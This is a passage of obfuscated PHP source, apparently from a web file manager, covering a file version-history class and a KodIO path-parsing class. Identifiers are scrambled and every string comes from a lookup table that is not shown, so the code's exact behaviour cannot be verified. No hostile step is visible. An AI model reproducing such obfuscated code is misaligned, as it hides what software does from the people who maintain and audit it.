} else { IO::rename($Θκ΄µ[$ΚΞ–φ„θ[87]], $µζ—ΨΤλ[1]); } } public static function eventBeforeMove($θ–©χΥ) { $Δ†‰µΣ° =& $_SERVER[γγάψ½]; $Ά΄ΖΑ£ = self::parsePath($θ–©χΥ[0]); if (!$Ά΄ΖΑ£) { return; } $§τ‚η‰Έ = self::parsePath($θ–©χΥ[1]); if (!$§τ‚η‰Έ) { return; } $δ©ΏΨΏ = $θ–©χΥ[3]; $ηωΧνΒϋ = self::checkInHistory($Ά΄ΖΑ£); if (!$ηωΧνΒϋ) { return; } $¶‘τ†ξΔ = self::pathHistory($§τ‚η‰Έ); if ($ηωΧνΒϋ[$Δ†‰µΣ°[33]] == $Δ†‰µΣ°[233]) { $ήΔ‚£α = self::listData($Ά΄ΖΑ£); $¶΄ξ³ = rtrim($§τ‚η‰Έ, $Δ†‰µΣ°[8]) . $Δ†‰µΣ°[8] . ($δ©ΏΨΏ ? $δ©ΏΨΏ : get_path_this($Ά΄ΖΑ£)); $ΰ¨θ­ρ = self::listData($¶΄ξ³); if ($ήΔ‚£α && $ήΔ‚£α[$Δ†‰µΣ°[448]] && $ΰ¨θ­ρ && $ΰ¨θ­ρ[$Δ†‰µΣ°[448]]) { return self::clear($Ά΄ΖΑ£); } if ($ήΔ‚£α && $ήΔ‚£α[$Δ†‰µΣ°[448]]) { self::moveHistory($Ά΄ΖΑ£, $δ©ΏΨΏ, $¶‘τ†ξΔ); } } else { IO::move($ηωΧνΒϋ[$Δ†‰µΣ°[87]], $¶‘τ†ξΔ, !1, $δ©ΏΨΏ); self::clearEmptyFolder(IO::pathFather($ηωΧνΒϋ[$Δ†‰µΣ°[87]])); } } public static function eventAfterRemove($Ίδ“Ε, $–θ’ε¬) { $όΚπΒ•† =& $_SERVER[γγάψ½]; if (!$–θ’ε¬) { return; } $Θ½‘Μ… = self::parsePath($Ίδ“Ε[0]); if (!$Θ½‘Μ…) { return; } $τή΄ο€Υ = self::checkInHistory($Θ½‘Μ…); if (!$τή΄ο€Υ) { return; } if ($τή΄ο€Υ[$όΚπΒ•†[33]] == $όΚπΒ•†[233]) { $¬Γ‚… = self::listData($Θ½‘Μ…, !1); if ($¬Γ‚… && $¬Γ‚…[$όΚπΒ•†[448]]) { self::clear($Θ½‘Μ…, !1); } } else { IO::remove($τή΄ο€Υ[$όΚπΒ•†[87]]); self::clearEmptyFolder(IO::pathFather($τή΄ο€Υ[$όΚπΒ•†[87]])); } } private static function checkInHistory($©αΌγβξ) { $ι‹ΊγΈι = self::pathHistory($©αΌγβξ); if (!IO::exist($ι‹ΊγΈι)) { $ι‹ΊγΈι .= $_SERVER[γγάψ½][1327]; } return IO::exist($ι‹ΊγΈι) ? IO::info($ι‹ΊγΈι) : !1; } private static function parsePath($½πΛµαη) { $†‚²Άδ =& $_SERVER[γγάψ½]; if (!$½πΛµαη) { return !1; } if (isset($GLOBALS[$†‚²Άδ[1328]]) && $GLOBALS[$†‚²Άδ[1328]]) { return; } $ύ›…Ή = KodIO::parse($½πΛµαη); $ γΞΤί = $ύ›…Ή[$†‚²Άδ[33]]; $υΧΏ¦”² = !$ γΞΤί || $ γΞΤί == KodIO::KOD_IO || $ γΞΤί == KodIO::KOD_SHARE_ITEM; if (!$υΧΏ¦”² || !$ύ›…Ή[$†‚²Άδ[1329]]) { return !1; } if (substr($½πΛµαη, 0, strlen(DATA_PATH . $†‚²Άδ[1330])) == DATA_PATH . $†‚²Άδ[1330]) { return !1; } if ($ γΞΤί == KodIO::KOD_SHARE_ITEM) { $‰½ΑίΜλ = IO::init($½πΛµαη); if ($‰½ΑίΜλ->pathParse[$†‚²Άδ[1241]]) { return self::parsePath($‰½ΑίΜλ->pathParse[$†‚²Άδ[1241]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $–ώ¬έβΨ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $†‚²Άδ[1331]); foreach ($–ώ¬έβΨ as $έϋ®Θ«Σ) { if (!$ γΞΤί && substr($½πΛµαη, 0, strlen($έϋ®Θ«Σ)) == $έϋ®Θ«Σ) { return !1; } } self::log($GLOBALS[$†‚²Άδ[1236]] . $†‚²Άδ[1332] . $½πΛµαη); return $½πΛµαη; } private static function pathHistory($ΛΉΧ²―) { $½ω·²΅ =& $_SERVER[γγάψ½]; $¬¬ώαϊ² = self::$_historyBase . ltrim(KodIO::clear($ΛΉΧ²―), $½ω·²΅[8]); $¬¬ώαϊ² = str_replace(array($½ω·²΅[1333]), array($½ω·²΅[1334]), $¬¬ώαϊ²); return $¬¬ώαϊ²; } public static function log($Ύξί›τ) { } public static function historyCount($Ϊ…»Β Θ) { $¬ΛζΡ  =& $_SERVER[γγάψ½]; $‚Ρ­ΌΝ = array(); $¨ρΒτ€ = array(); foreach ($Ϊ…»Β Θ as $ΆΈΏ €) { $ά±ΩΛΗ¨ = get_path_father($ΆΈΏ €); if (!$¨ρΒτ€[$ά±ΩΛΗ¨]) { $¨ρΒτ€[$ά±ΩΛΗ¨] = array(); } $¨ρΒτ€[$ά±ΩΛΗ¨][] = get_path_this($ΆΈΏ €); } foreach ($¨ρΒτ€ as $ά±ΩΛΗ¨ => $Ϋ¶ΝΩκ) { $©Νω€Δ¬ = self::parsePath($ά±ΩΛΗ¨); if (!$©Νω€Δ¬) { continue; } foreach ($Ϋ¶ΝΩκ as $ΫΥύΪΠΔ) { $‚ϋ = self::listData(rtrim($©Νω€Δ¬, $¬ΛζΡ [8]) . $¬ΛζΡ [8] . $ΫΥύΪΠΔ, !1); if ($‚ϋ && $‚ϋ[$¬ΛζΡ [448]]) { $‚Ρ­ΌΝ[rtrim($ά±ΩΛΗ¨, $¬ΛζΡ [8]) . $¬ΛζΡ [8] . $ΫΥύΪΠΔ] = count($‚ϋ[$¬ΛζΡ [448]]); } } } return $‚Ρ­ΌΝ; } public static function add($΅Ζ·Ϊύ) { $ψσΜ•£ =& $_SERVER[γγάψ½]; $±²―Ύ”¬ = self::listData($΅Ζ·Ϊύ); if (!$±²―Ύ”¬) { return; } $†Ωμ = Model($ψσΜ•£[845])->get($ψσΜ•£[1335]); $ΞυόΚ©ΰ = intval($GLOBALS[$ψσΜ•£[6]][$ψσΜ•£[92]][$ψσΜ•£[1313]]); $Ϋ—·Φί = $†Ωμ == $ψσΜ•£[1336] ? min(5, $ΞυόΚ©ΰ) : $ΞυόΚ©ΰ; if ($ΞυόΚ©ΰ <= 0) { return; } $ΉΖΪφάσ = IO::info($΅Ζ·Ϊύ); $‘ε›’έπ = $±²―Ύ”¬[$ψσΜ•£[448]]; if ($ΉΖΪφάσ[$ψσΜ•£[79]] == 0) { return; } if ($ΉΖΪφάσ[$ψσΜ•£[79]] >= 1024 * 1024 * 500) { return !1; } $ί΄ΓΕΔ = IO::hashSimple($΅Ζ·Ϊύ); if ($‘ε›’έπ && $‘ε›’έπ[0][$ψσΜ•£[680]] == $ί΄ΓΕΔ) { return !0; } if (array_key_exists($ψσΜ•£[236], $ΉΖΪφάσ) && !$ΉΖΪφάσ[$ψσΜ•£[236]]) { return !1; } $¦†ΤαΘ = short_id(time()); $³Ά’δΕή = array($ψσΜ•£[478] => $¦†ΤαΘ, $ψσΜ•£[680] => $ί΄ΓΕΔ, $ψσΜ•£[32] => $ΉΖΪφάσ[$ψσΜ•£[32]] . $ψσΜ•£[10] . date($ψσΜ•£[1337]) . rand_string(1), $ψσΜ•£[79] => $ΉΖΪφάσ[$ψσΜ•£[79]], $ψσΜ•£[530] => USER_ID, $ψσΜ•£[234] => time(), $ψσΜ•£[1338] => $ψσΜ•£[12]); IO::mkdir($±²―Ύ”¬[$ψσΜ•£[1339]]); $φδψΊ¤” = IO::copy($΅Ζ·Ϊύ, $±²―Ύ”¬[$ψσΜ•£[1339]], !1, $³Ά’δΕή[$ψσΜ•£[32]]); if (!$φδψΊ¤”) { self::clearEmptyFolder($±²―Ύ”¬[$ψσΜ•£[1339]]); return !1; } array_unshift($‘ε›’έπ, $³Ά’δΕή); if (count($‘ε›’έπ) > $Ϋ—·Φί) { $ί†Ώτ­β = array_slice($‘ε›’έπ, $Ϋ—·Φί); foreach ($ί†Ώτ­β as $ƒφίβ) { IO::remove($±²―Ύ”¬[$ψσΜ•£[1339]] . $ƒφίβ[$ψσΜ•£[32]]); } $‘ε›’έπ = array_slice($‘ε›’έπ, 0, $Ϋ—·Φί); } return self::saveData($±²―Ύ”¬[$ψσΜ•£[1340]], $‘ε›’έπ); } public static function remove($ζΎεΣΨ, $–δΏΌ) { $°Χή΄Γ =& $_SERVER[γγάψ½]; $‰ΜΦ = self::listData($ζΎεΣΨ); $ΠΘψΖΐ = array(); if (!$‰ΜΦ) { return !1; } foreach ($‰ΜΦ[$°Χή΄Γ[448]] as $‚°§ƒ°‹) { if ($‚°§ƒ°‹[$°Χή΄Γ[478]] == $–δΏΌ) { IO::remove($‰ΜΦ[$°Χή΄Γ[1339]] . $‚°§ƒ°‹[$°Χή΄Γ[32]]); continue; } $ΠΘψΖΐ[] = $‚°§ƒ°‹; } return self::saveData($‰ΜΦ[$°Χή΄Γ[1340]], $ΠΘψΖΐ); } public static function clear($ΪΞ¦±, $ΥξΏ©άΈ = true) { $±Ω”μµΆ =& $_SERVER[γγάψ½]; $ΣΞϊυ = self::listData($ΪΞ¦±, $ΥξΏ©άΈ); if (!$ΣΞϊυ) { return !1; } foreach ($ΣΞϊυ[$±Ω”μµΆ[448]] as $ƒίώ―Ρώ) { IO::remove($ΣΞϊυ[$±Ω”μµΆ[1339]] . $ƒίώ―Ρώ[$±Ω”μµΆ[32]]); } return self::saveData($ΣΞϊυ[$±Ω”μµΆ[1340]], array()); } public static function moveHistory($ΰί©ηί‰, $Κϊ¦Ϊ = '', $ΔίΊ¥Λ = '') { $ρΒ†αϊ« =& $_SERVER[γγάψ½]; $ΕνΥζ² = self::listData($ΰί©ηί‰, !1); if (!$ΕνΥζ² || !$ΕνΥζ²[$ρΒ†αϊ«[448]]) { return !1; } $‹ϊχ‰Ώ¬ = $ρΒ†αϊ«[1327]; $Κϊ¦Ϊ = $Κϊ¦Ϊ ? $Κϊ¦Ϊ : get_path_this($ΰί©ηί‰); $ΔίΊ¥Λ = $ΔίΊ¥Λ ? $ΔίΊ¥Λ : $ΕνΥζ²[$ρΒ†αϊ«[1339]]; $®βΐΰΫΒ = substr(get_path_this($ΕνΥζ²[$ρΒ†αϊ«[1340]]), 0, -strlen($‹ϊχ‰Ώ¬)); foreach ($ΕνΥζ²[$ρΒ†αϊ«[448]] as $™§Γ²Ζ => $ ”ιλδ) { $΅΄Κβχ = $Κϊ¦Ϊ . substr($ ”ιλδ[$ρΒ†αϊ«[32]], strlen($®βΐΰΫΒ)); $Δ–δΠη = IO::move($ΕνΥζ²[$ρΒ†αϊ«[1339]] . $ ”ιλδ[$ρΒ†αϊ«[32]], $ΔίΊ¥Λ, !1, $΅΄Κβχ); if ($Δ–δΠη) { $ΕνΥζ²[$ρΒ†αϊ«[448]][$™§Γ²Ζ][$ρΒ†αϊ«[32]] = $΅΄Κβχ; } } $ΕνΥζ²[$ρΒ†αϊ«[1340]] = IO::move($ΕνΥζ²[$ρΒ†αϊ«[1340]], $ΔίΊ¥Λ, !1, $Κϊ¦Ϊ . $‹ϊχ‰Ώ¬); self::saveData($ΕνΥζ²[$ρΒ†αϊ«[1340]], $ΕνΥζ²[$ρΒ†αϊ«[448]]); self::clearEmptyFolder($ΕνΥζ²[$ρΒ†αϊ«[1339]]); } public static function rollback($κΔ²ΔΧ, $—Ή‚…Ή) { $λΌΖόΉ› =& $_SERVER[γγάψ½]; $¬ΑΰƒΌ = self::listData($κΔ²ΔΧ); if (!$¬ΑΰƒΌ) { return; } $°ΰ = IO::info($κΔ²ΔΧ); foreach ($¬ΑΰƒΌ[$λΌΖόΉ›[448]] as $δΟ—ΣƒΨ => $΅ω€ϋ) { if ($΅ω€ϋ[$λΌΖόΉ›[478]] == $—Ή‚…Ή) { self::add($κΔ²ΔΧ); $·ΑόΡ‰Ξ = $¬ΑΰƒΌ[$λΌΖόΉ›[1339]] . $΅ω€ϋ[$λΌΖόΉ›[32]]; $Ω²ή—ςΐ = IO::copy($·ΑόΡ‰Ξ, IO::pathFather($κΔ²ΔΧ), REPEAT_REPLACE, $°ΰ[$λΌΖόΉ›[32]]); if ($Ω²ή—ςΐ) { self::remove($κΔ²ΔΧ, $—Ή‚…Ή); } return $Ω²ή—ςΐ; } } return !1; } public static function setDetail($Ύ§³Θξυ, $Έ¬‘χ„, $ΪΈΒ…¤ ) { $΄κς¦αί =& $_SERVER[γγάψ½]; $΄¤ηιιώ = self::listData($Ύ§³Θξυ); if (!$΄¤ηιιώ) { return; } foreach ($΄¤ηιιώ[$΄κς¦αί[448]] as $ΌΌψ¬¦Ο => $ρΪΕςψ) { if ($ρΪΕςψ[$΄κς¦αί[478]] == $Έ¬‘χ„) { $΄¤ηιιώ[$΄κς¦αί[448]][$ΌΌψ¬¦Ο][$΄κς¦αί[1338]] = $ΪΈΒ…¤ ; self::saveData($΄¤ηιιώ[$΄κς¦αί[1340]], $΄¤ηιιώ[$΄κς¦αί[448]]); return !0; } } return !1; } public static function fileInfo($ΜαΌ΄, $Υ±σ£ό‘) { $ΓΜΎα– =& $_SERVER[γγάψ½]; $ώ¨όΌΌ = self::listData($ΜαΌ΄); if (!$ώ¨όΌΌ) { show_json(LNG($ΓΜΎα–[108]), !1); } $Ώ‡€ψΒ = $ΓΜΎα–[12]; foreach ($ώ¨όΌΌ[$ΓΜΎα–[448]] as $Λ†θτω¤ => $ΣΣζ»Η) { if ($ΣΣζ»Η[$ΓΜΎα–[478]] != $Υ±σ£ό‘) { continue; } $Ώ‡€ψΒ = $ώ¨όΌΌ[$ΓΜΎα–[1339]] . $ΣΣζ»Η[$ΓΜΎα–[32]]; break; } if (!$Ώ‡€ψΒ) { show_json(LNG($ΓΜΎα–[108]), !1); } return IO::info($Ώ‡€ψΒ); } public static function fileOut($ιύτκ¥ς, $¨Θζ¦ό, $λξλ‘ρΕ = false) { $‘™ώσΡ† =& $_SERVER[γγάψ½]; $µΜΏΐά¶ = self::fileInfo($ιύτκ¥ς, $¨Θζ¦ό); $χύ–¬Τ΅ =& $GLOBALS[$‘™ώσΡ†[7]]; $λξλ‘ρΕ = isset($χύ–¬Τ΅[$‘™ώσΡ†[1290]]) && $χύ–¬Τ΅[$‘™ώσΡ†[1290]] == 1; if (isset($χύ–¬Τ΅[$‘™ώσΡ†[33]]) && $χύ–¬Τ΅[$‘™ώσΡ†[33]] == $‘™ώσΡ†[1341]) { return IO::fileOutImage($µΜΏΐά¶[$‘™ώσΡ†[87]], $χύ–¬Τ΅[$‘™ώσΡ†[1342]]); } IO::fileOut($µΜΏΐά¶[$‘™ώσΡ†[87]], $λξλ‘ρΕ, get_path_this($ιύτκ¥ς)); } public static function listData($ΰΘψώ­υ, $ζ«λ™£ = true) { $·ΧΩ³ =& $_SERVER[γγάψ½]; if ($ζ«λ™£ && !IO::exist($ΰΘψώ­υ)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($ΰΘψώ­υ, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $ΐς‡ΣΡ = self::pathHistory($ΰΘψώ­υ); $ ϋΧ―σ = array($·ΧΩ³[1340] => $ΐς‡ΣΡ . $·ΧΩ³[1327], $·ΧΩ³[1339] => rtrim(get_path_father($ΐς‡ΣΡ), $·ΧΩ³[8]) . $·ΧΩ³[8], $·ΧΩ³[448] => array()); $υώΰΡΪ = IO::getContent($ ϋΧ―σ[$·ΧΩ³[1340]]); if ($υώΰΡΪ) { $®ΝƒΆΏ = json_decode($υώΰΡΪ, !0); if (is_array($®ΝƒΆΏ)) { $ ϋΧ―σ[$·ΧΩ³[448]] = $®ΝƒΆΏ; } } return $ ϋΧ―σ; } private static function saveData($ζ©ίƒ, $‡λ®π) { $δαώΜ =& $_SERVER[γγάψ½]; self::log($δαώΜ[1343] . $ζ©ίƒ . $δαώΜ[74] . count($‡λ®π), $δαώΜ[827]); if ($‡λ®π) { return IO::setContent($ζ©ίƒ, json_encode($‡λ®π)); } $Ε…”½ΛΆ = IO::pathFather($ζ©ίƒ); IO::remove($ζ©ίƒ); self::clearEmptyFolder($Ε…”½ΛΆ); return !0; } public static function clearEmptyFolder($ήω®εΖο) { $ΛΌΊβ =& $_SERVER[γγάψ½]; if (trim($ήω®εΖο, $ΛΌΊβ[8]) == trim(self::$_historyBase, $ΛΌΊβ[8])) { return; } $ήΙΰ±Θ = IO::pathFather($ήω®εΖο); $Β’™©‘ = IO::has($ήω®εΖο, !0); if ($Β’™©‘[$ΛΌΊβ[242]] > 0 || $Β’™©‘[$ΛΌΊβ[243]] > 0) { return; } IO::remove($ήω®εΖο); self::clearEmptyFolder($ήΙΰ±Θ); } private static function getBasePath() { $Α’¦Βΰ =& $_SERVER[γγάψ½]; $ΜΓΆΉ = Model($Α’¦Βΰ[1344])->get($Α’¦Βΰ[1345]); if ($ΜΓΆΉ) { if (!IO::exist($ΜΓΆΉ)) { IO::mkdir($ΜΓΆΉ); } if (get_path_this($ΜΓΆΉ) == $Α’¦Βΰ[1330]) { $”Ί‘Ώδ = $Α’¦Βΰ[1346] . rand_string(8); @rename($ΜΓΆΉ, get_path_father($ΜΓΆΉ) . $Α’¦Βΰ[8] . $”Ί‘Ώδ); $ΜΓΆΉ = DATA_PATH . $”Ί‘Ώδ . $Α’¦Βΰ[8]; file_put_contents(DATA_PATH . $Α’¦Βΰ[1277], $Α’¦Βΰ[12]); Model($Α’¦Βΰ[1344])->set($Α’¦Βΰ[1345], $ΜΓΆΉ); } return $ΜΓΆΉ; } $ΜΓΆΉ = DATA_PATH . $Α’¦Βΰ[1346] . rand_string(8) . $Α’¦Βΰ[8]; $ΜΓΆΉ = IO::mkdir($ΜΓΆΉ); $ΜΓΆΉ = rtrim($ΜΓΆΉ, $Α’¦Βΰ[8]) . $Α’¦Βΰ[8]; file_put_contents($ΜΓΆΉ . $Α’¦Βΰ[1277], $Α’¦Βΰ[12]); file_put_contents(DATA_PATH . $Α’¦Βΰ[1277], $Α’¦Βΰ[12]); Model($Α’¦Βΰ[1344])->set($Α’¦Βΰ[1345], $ΜΓΆΉ); return $ΜΓΆΉ; } } class KodIO { const KOD_SOURCE = "\x7b\x73\x6f\165\x72\143\x65\175"; const KOD_USER_RECYCLE = "\173\165\163\x65\162\122\145\143\x79\x63\154\145\175"; const KOD_USER_FAV = "\173\165\x73\145\x72\106\x61\166\175"; const KOD_USER_FILE_TAG = "\x7b\165\x73\x65\162\x46\151\x6c\145\x54\141\147\175"; const KOD_USER_FILE_TYPE = "\x7b\x75\163\x65\162\106\x69\154\145\124\171\160\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\173\147\x72\157\165\x70\122\157\x6f\x74\123\145\x6c\x66\175"; const KOD_USER_SHARE = "\173\165\x73\x65\x72\x53\150\x61\x72\145\x7d"; const KOD_USER_SHARE_LINK = "\x7b\x75\163\145\162\123\x68\x61\x72\145\114\151\156\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\163\150\141\x72\145\x54\x6f\x4d\x65\x7d"; const KOD_SHARE_ITEM = "\x7b\163\150\141\162\145\111\x74\x65\155\x7d"; const KOD_SHARE_LINK = "\173\x73\150\141\162\x65\111\164\145\x6d\114\x69\x6e\x6b\x7d"; const KOD_SEARCH = "\x7b\163\x65\141\x72\143\x68\175"; const KOD_BLOCK = "\173\x62\154\157\x63\153\175"; const KOD_IO = "\173\151\157\175"; const KOD_USER_RECENT = "\x7b\x75\x73\x65\x72\x52\145\156\143\145\156\x74\175"; const KOD_USER_DRIVER = "\x7b\144\162\151\x76\145\x72\x7d"; public static function typeList() { $‘ψΝΈΊΝ =& $_SERVER[γγάψ½]; return array($‘ψΝΈΊΝ[1347] => self::KOD_SOURCE, $‘ψΝΈΊΝ[1348] => self::KOD_USER_RECYCLE, $‘ψΝΈΊΝ[1349] => self::KOD_USER_FAV, $‘ψΝΈΊΝ[1350] => self::KOD_USER_FILE_TAG, $‘ψΝΈΊΝ[1351] => self::KOD_USER_FILE_TYPE, $‘ψΝΈΊΝ[1352] => self::KOD_GROUP_ROOT_SELF, $‘ψΝΈΊΝ[1353] => self::KOD_USER_SHARE, $‘ψΝΈΊΝ[1354] => self::KOD_USER_SHARE_LINK, $‘ψΝΈΊΝ[1355] => self::KOD_USER_SHARE_TO_ME, $‘ψΝΈΊΝ[1356] => self::KOD_SHARE_ITEM, $‘ψΝΈΊΝ[1357] => self::KOD_SHARE_LINK, $‘ψΝΈΊΝ[1358] => self::KOD_SEARCH, $‘ψΝΈΊΝ[1359] => self::KOD_BLOCK, $‘ψΝΈΊΝ[1360] => self::KOD_IO, $‘ψΝΈΊΝ[1361] => self::KOD_USER_RECENT, $‘ψΝΈΊΝ[1362] => self::KOD_USER_DRIVER); } public static function parse($¤ΑΙΤ) { $υΗΤΔ =& $_SERVER[γγάψ½]; $¤ΑΙΤ = self::clear($¤ΑΙΤ); $ƒή“Ευ΄ = array_values(self::typeList()); preg_match($υΗΤΔ[1363], $¤ΑΙΤ, $―νψΚσ); $ο¥’“‚ = array($υΗΤΔ[499] => !1, $υΗΤΔ[1364] => !1, $υΗΤΔ[496] => !1, $υΗΤΔ[87] => $¤ΑΙΤ, $υΗΤΔ[1261] => !1, $υΗΤΔ[1260] => $υΗΤΔ[12]); if (is_array($―νψΚσ) && count($―νψΚσ) == 5) { $Υ‘σξµύ = $υΗΤΔ[1365] . $―νψΚσ[2] . $υΗΤΔ[405]; if (in_array($Υ‘σξµύ, $ƒή“Ευ΄)) { $ο¥’“‚[$υΗΤΔ[1261]] = $―νψΚσ[1]; $ο¥’“‚[$υΗΤΔ[33]] = $Υ‘σξµύ; $ο¥’“‚[$υΗΤΔ[1366]] = substr($Υ‘σξµύ, 1, -1); $ο¥’“‚[$υΗΤΔ[478]] = $―νψΚσ[3]; } $ο¥’“‚[$υΗΤΔ[1260]] = $―νψΚσ[4]; } if ($ο¥’“‚[$υΗΤΔ[499]] == self::KOD_SOURCE) { $ο¥’“‚[$υΗΤΔ[1264]] = $ο¥’“‚[$υΗΤΔ[478]]; } $δΧΕΩΗ = array($υΗΤΔ[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $ο¥’“‚[$υΗΤΔ[1329]] = in_array($ο¥’“‚[$υΗΤΔ[33]], $δΧΕΩΗ); return $ο¥’“‚; } public static function isTruePath($λΨ°…Σ) { $π³Δ©‡’ =& $_SERVER[γγάψ½]; if (substr($λΨ°…Σ, 0, 1) != $π³Δ©‡’[1365]) { return !0; } if (strpos($λΨ°…Σ, $π³Δ©‡’[486]) === 0) { return !0; } if (strpos($λΨ°…Σ, $π³Δ©‡’[1333]) === 0) { return !0; } if (strpos($λΨ°…Σ, $π³Δ©‡’[1367]) === 0) { return !0; } if (strpos($λΨ°…Σ, $π³Δ©‡’[1368]) === 0) { return !0; } if (strpos($λΨ°…Σ, $π³Δ©‡’[1369]) === 0) { return !0; } return !1; } public static function clear($ρΣ²ΛΓκ) { $†“ΉΟ =& $_SERVER[γγάψ½]; $ρΣ²ΛΓκ = str_replace(array($†“ΉΟ[1165], $†“ΉΟ[288]), $†“ΉΟ[53], $ρΣ²ΛΓκ); $ρΣ²ΛΓκ = str_replace($†“ΉΟ[100], $†“ΉΟ[8], $ρΣ²ΛΓκ); $£Μ±Οζ = $†“ΉΟ[1370]; if (substr($ρΣ²ΛΓκ, 0, 3) == $†“ΉΟ[1371]) { $ρΣ²ΛΓκ = substr($ρΣ²ΛΓκ, 3); } while (strstr($ρΣ²ΛΓκ, $£Μ±Οζ)) { $ρΣ²ΛΓκ = str_replace($£Μ±Οζ, $†“ΉΟ[8], $ρΣ²ΛΓκ); } $ρΣ²ΛΓκ = preg_replace($†“ΉΟ[1372], $†“ΉΟ[8], $ρΣ²ΛΓκ); if ($ρΣ²ΛΓκ == $†“ΉΟ[8]) { return $†“ΉΟ[8]; } $ρΣ²ΛΓκ = rtrim($ρΣ²ΛΓκ, $†“ΉΟ[8]); return $ρΣ²ΛΓκ; } public static function pathTrue($ϊ›®α) { $χβυ¶© =& $_SERVER[γγάψ½]; if (!$ϊ›®α) { return $χβυ¶©[12]; } $ϊ›®α = str_replace($χβυ¶©[257], $χβυ¶©[8], str_replace($χβυ¶©[1373], $χβυ¶©[8], $ϊ›®α)); $ϊ›®α = str_replace($χβυ¶©[257], $χβυ¶©[8], str_replace($χβυ¶©[1373], $χβυ¶©[8], $ϊ›®α)); if (!strstr($ϊ›®α, $χβυ¶©[1371])) { return $ϊ›®α; } $¬ψ·έ‹Τ = explode($χβυ¶©[8], $ϊ›®α); foreach ($¬ψ·έ‹Τ as $ΣΗ‘σ¦ => $¬πδµΎ§) { if ($¬πδµΎ§ !== $χβυ¶©[1374]) { continue; } for ($™ΎαΤ“Γ = $ΣΗ‘σ¦; $™ΎαΤ“Γ >= 0; $™ΎαΤ“Γ--) { if ($¬ψ·έ‹Τ[$™ΎαΤ“Γ] === $χβυ¶©[10] || $¬ψ·έ‹Τ[$™ΎαΤ“Γ] === $χβυ¶©[1374] || $¬ψ·έ‹Τ[$™ΎαΤ“Γ] === -1) { continue; } if ($¬ψ·έ‹Τ[$™ΎαΤ“Γ] === $χβυ¶©[12]) { $¬ψ·έ‹Τ[$ΣΗ‘σ¦] = -1; break; } $¬ψ·έ‹Τ[$ΣΗ‘σ¦] = -1; $¬ψ·έ‹Τ[$™ΎαΤ“Γ] = -1; break; } } $Α€•‘β = array(); foreach ($¬ψ·έ‹Τ as $¬πδµΎ§) { if ($¬πδµΎ§ !== -1) { $Α€•‘β[] = $¬πδµΎ§; } } $”ιμ’¨κ = implode($χβυ¶©[8], $Α€•‘β); if (strpos($”ιμ’¨κ, $χβυ¶©[1375]) === 0) { $”ιμ’¨κ = $χβυ¶©[1371] . substr($”ιμ’¨κ, strlen($χβυ¶©[1375])); } return $”ιμ’¨κ; } public static function pathUrlClear($ρΥµ–ς) { $¶‡μϊο =& $_SERVER[γγάψ½]; if (!$ρΥµ–ς) { return $ρΥµ–ς; } $ρΥµ–ς = rawurldecode($ρΥµ–ς); $ρΥµ–ς = str_replace($¶‡μϊο[1373], $¶‡μϊο[8], $ρΥµ–ς); if (strpos($ρΥµ–ς, $¶‡μϊο[76]) > 0) { $ρΥµ–ς = substr($ρΥµ–ς, 0, strpos($ρΥµ–ς, $¶‡μϊο[76])); } if (strpos($ρΥµ–ς, $¶‡μϊο[1376]) > 0) { $ρΥµ–ς = substr($ρΥµ–ς, 0, strpos($ρΥµ–ς, $¶‡μϊο[1376])); } return $ρΥµ–ς; } public static function sourceID($ωίΞ¶›€) { $–ΓΕζϋ =& $_SERVER[γγάψ½]; $†›ί = self::parse($ωίΞ¶›€); if ($†›ί[$–ΓΕζϋ[33]] !== self::KOD_SOURCE) { show_json(LNG($–ΓΕζϋ[1377]), !1); } return $†›ί[$–ΓΕζϋ[478]]; } public static function make($°‡ΗήΘϋ) { if (!$°‡ΗήΘϋ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($°‡ΗήΘϋ)); } public static function makeShare($«Ύβάγ, $“™σ®¶γ) { return self::makePath(self::KOD_SHARE_ITEM, $«Ύβάγ, $“™σ®¶γ); } public static function makeFileTypePath($αΜΔΈ‡) { return self::makePath(self::KOD_USER_FILE_TYPE, $αΜΔΈ‡); } public static function makeFileTagPath($ϊΆϋΕέ) { return self::makePath(self::KOD_USER_FILE_TAG, $ϊΆϋΕέ); } public static function makePath($­ΘΈπ³, $Θΰ‘¦Γυ = '', $•ώΗΏάΜ = '') { $ΫΖΟΥ—Ν =& $_SERVER[γγάψ½]; $©†…†Μ = substr($­ΘΈπ³, 1, -1); $–κ«…‡ = $ΫΖΟΥ—Ν[1378] . $©†…†Μ . $ΫΖΟΥ—Ν[1379] . $Θΰ‘¦Γυ . $ΫΖΟΥ—Ν[1380]; $–κ«…‡ = $•ώΗΏάΜ ? $–κ«…‡ . $•ώΗΏάΜ . $ΫΖΟΥ—Ν[8] : $–κ«…‡; return $–κ«…‡; } public static function hashPath($’±χφΗν, $ΟωωΊΩ¥ = false) { $Ν³δΛχ =& $_SERVER[γγάψ½]; if (!$’±χφΗν) { return $Ν³δΛχ[12]; } $ψΌη = is_array($’±χφΗν) ? $’±χφΗν : IO::info($’±χφΗν); $ΝΜ•”― = _get($ψΌη, $Ν³δΛχ[1381], $Ν³δΛχ[12]); if (!$ΝΜ•”― && isset($ψΌη[$Ν³δΛχ[238]])) { $ΝΜ•”― = trim($ψΌη[$Ν³δΛχ[238]], $Ν³δΛχ[121]); } if ($ΝΜ•”―) { return $ΝΜ•”―; } if (!$ΝΜ•”― && isset($ψΌη[$Ν³δΛχ[194]]) && $ψΌη[$Ν³δΛχ[194]]) { $ψΌη = IO::info(KodIO::make($ψΌη[$Ν³δΛχ[194]])); $ΝΜ•”― = _get($ψΌη, $Ν³δΛχ[1381], $Ν³δΛχ[12]); } $ξ³·µ‹ = md5($ψΌη[$Ν³δΛχ[87]] . $ψΌη[$Ν³δΛχ[79]] . $ψΌη[$Ν³δΛχ[88]]); $ΒΣ—‰θ± = $ξ³·µ‹ . $Ν³δΛχ[1382]; $ΝΜ•”― = $ΝΜ•”― ? $ΝΜ•”― : Cache::get($ΒΣ—‰θ±); if (!$ΝΜ•”― && $ΟωωΊΩ¥) { $ΝΜ•”― = IO::hashSimple($ψΌη[$Ν³δΛχ[87]]); Cache::set($ΒΣ—‰θ±, $ΝΜ•”― ? $ΝΜ•”― : $ξ³·µ‹, 3600 * 24 * 30); } return 